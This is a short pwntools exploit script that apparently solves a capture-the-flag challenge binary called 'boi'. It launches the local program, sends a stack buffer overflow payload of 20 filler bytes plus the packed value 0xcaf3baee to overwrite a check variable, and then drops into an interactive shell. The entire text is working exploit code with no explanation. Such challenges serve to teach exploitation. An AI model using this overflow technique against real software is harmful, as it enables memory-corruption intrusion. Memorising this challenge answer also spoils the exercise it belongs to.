from pwn import *

p = process("./boi")

payload = b"\x41" * 20
targetAddress = p32(0xcaf3baee)

exploit = payload + targetAddress

p.sendline(exploit)

p.interactive()
